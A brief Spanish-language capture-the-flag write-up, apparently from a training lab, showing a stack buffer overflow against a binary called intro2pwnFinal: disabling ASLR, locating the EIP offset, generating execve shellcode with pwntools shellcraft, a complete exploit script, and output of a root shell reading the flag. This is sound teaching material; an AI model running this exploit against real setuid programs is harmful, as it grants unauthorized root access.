# Shellcraft

- deshabilitar ASLR (address space layout randomization)

```bash
sudo ./disable_aslr.sh
```

- detectar el punto de quiebre y obtener EIP e ESP

```shell
thm> cyclic 100 > padding
gdb ./intro2pwnFinal
pwndbg> r < padding
 ESP  0xffffd4e0 ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x61616174 ('taaa')
```

- creamos el shellcode con shellcraft

```bash
shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f s
"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
```

- crear el exploit

```python
from pwn import *
proc = process('./intro2pwnFinal')
proc.recvline()
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd4e0+200)
nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode
proc.send(payload)
proc.interactive()
```

- ejecutar el payload

```bash
python exp.py 
[+] Starting local process './intro2pwnFinal': pid 2036
[*] Switching to interactive mode
$ whoami
$ id
uid=1001(buzz) gid=1001(buzz) euid=0(root) groups=1001(buzz)
$ cd /root
$ ls
flag.txt
$ cat flag.txt
flag{pwn!ng_!$_fr33d0m}
$  
```